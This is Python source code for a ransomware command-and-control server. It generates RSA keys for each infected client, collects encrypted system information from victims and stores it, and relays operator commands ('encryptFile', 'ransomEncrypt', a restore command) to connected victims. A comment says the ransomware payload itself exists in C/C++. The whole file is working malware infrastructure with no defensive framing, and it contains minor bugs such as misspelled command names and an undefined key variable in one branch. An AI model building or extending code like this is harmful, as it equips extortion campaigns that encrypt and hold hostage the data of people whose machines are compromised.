import socket
import threading
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
import json
import os

def recvall(sock, n):
    data = bytearray()
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data.extend(packet)
    return data

class C2Server:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.control_port = 8889
        self.client_keys = {}
        self.client_sockets = {}  # New dictionary to map client IDs to their sockets
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)
        self.control_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.control_socket.bind((self.host, self.control_port))
        self.control_socket.listen(1)
        print(f"C2 server listening on {self.host}:{self.port} and control on {self.control_port}")

    def handle_client(self, client_socket, client_address):
        client_id = client_address[0]
        print(f"Connection from {client_address}, Client ID: {client_id}")

        # Store client socket
        self.client_sockets[client_id] = client_socket

        if client_id not in self.client_keys:
            self.register_client(client_id)

        _, client_public_key_pem = self.client_keys[client_id]
        client_socket.sendall(client_public_key_pem)

        self.process_system_info(client_socket, client_id)
        client_socket.close()
        del self.client_sockets[client_id]  # Remove socket from dictionary when done
        print(f"Connection with Client ID: {client_id} closed.")

    def generate_keys(self):
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )
        public_key = private_key.public_key()

        private_key_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,  # PKCS8 is the standard format for private keys
            encryption_algorithm=serialization.NoEncryption()  # No password protection
        )
        public_key_pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        return private_key_pem, public_key_pem

    def register_client(self, client_id):
        private_key, public_key = self.generate_keys()
        self.client_keys[client_id] = (private_key, public_key)

    def process_system_info(self, client_socket, client_id):
        private_key_pem, _ = self.client_keys[client_id]
        private_key = serialization.load_pem_private_key(
            private_key_pem,
            password=None,
            backend=default_backend()
        )

        decrypted_data_all = ""  # Initialize a string to accumulate decrypted data
        while True:
            encrypted_chunk = recvall(client_socket, 256)
            if encrypted_chunk is None or encrypted_chunk == b'EOF':
                break

            if isinstance(encrypted_chunk, bytearray):
                encrypted_chunk = bytes(encrypted_chunk)

            try:
                decrypted_data = private_key.decrypt(
                    encrypted_chunk,
                    padding.OAEP(
                        mgf=padding.MGF1(algorithm=hashes.SHA256()),
                        algorithm=hashes.SHA256(),
                        label=None
                    )
                )
                decrypted_data_all += decrypted_data.decode('utf-8')
            except Exception as e:
                print(f"Decryption failed: {e}")
                break
        
        if decrypted_data_all:
            self.save_decrypted_data(client_id, decrypted_data_all)


    def save_decrypted_data(self, client_id, data):
        # Create a directory to store client data if it does not exist
        os.makedirs('client_data', exist_ok=True)
        file_path = os.path.join('client_data', f'{client_id}.json')
        with open(file_path, 'w') as file:
            json.dump(data, file, indent=4)
        print(f"Data for Client ID {client_id} saved to {file_path}")

    # Handle commands from CLI
    def handle_control_connection(self):
        while True:
            conn, _ = self.control_socket.accept()
            with conn:
                command = conn.recv(1024).decode().split()
                if len(command) < 2:
                    continue
                action, client_id = command[0], command[1]
                if client_id in self.client_keys and client_id in self.client_sockets:
                    """
                    encryptFile <client_id> <filename> - encrypts a specified file using the client's public key
                    decyrptFile <client_id> <filename> - decrypts a file using the host's private key
                    ransomEncrypt <client_id> - encrypts system using transmitted public key
                    ransomDecrypt <client_id> - decrypts specified system
                    """
                    if action == "send_private_key":
                        private_key_pem, _ = self.client_keys[client_id]
                        self.client_sockets[client_id].sendall(b'pk')
                        self.client_sockets[client_id].sendall(private_key_pem)
                        self.client_sockets[client_id].sendall(b'EOF') # mark end of data stream
                        print(f"Private key sent directly to client {client_id}")
                    elif action == "encryptFile":
                        fileName = command[2]
                        self.client_sockets[client_id].sendall(b'enc')
                        self.client_sockets[client_id].sendall(fileName.encode())
                        self.client_sockets[client_id].sendall(b'EOF') # mark end of data stream
                    elif action == "decryptFile":
                        fileName = command[2]
                        self.client_sockets[client_id].sendall(b'dec')
                        self.client_sockets[client_id].sendall(fileName.encode())
                        self.client_sockets[client_id].sendall(b'EOF') # mark end of data stream
                    # Already implemented in C/C++
                    elif action == "ransomEncrypt":
                        self.client_sockets[client_id].sendall(b'enc')
                        print("Ransomware starting...")
                        self.client_sockets[client_id].sendall(b'EOF') # mark end of data stream
                    elif action == "ransomDencrypt":
                        self.client_sockets[client_id].sendall(b'res')
                        self.client_sockets[client_id].sendall(private_key_pem)
                        print("Restoring data on {client_id}...")
                        self.client_sockets[client_id].sendall(b'EOF') # mark end of data stream
                    else:
                        conn.sendall(b"Invalid command or client ID")

    def run(self):
        control_thread = threading.Thread(target=self.handle_control_connection)
        control_thread.daemon = True
        control_thread.start()
        try:
            while True:
                client_socket, client_address = self.server_socket.accept()
                threading.Thread(target=self.handle_client, args=(client_socket, client_address)).start()
        except KeyboardInterrupt:
            print("Server is shutting down.")
            self.server_socket.close()
            raise

if __name__ == '__main__':
    server = C2Server('localhost', 8888)
    server.run()
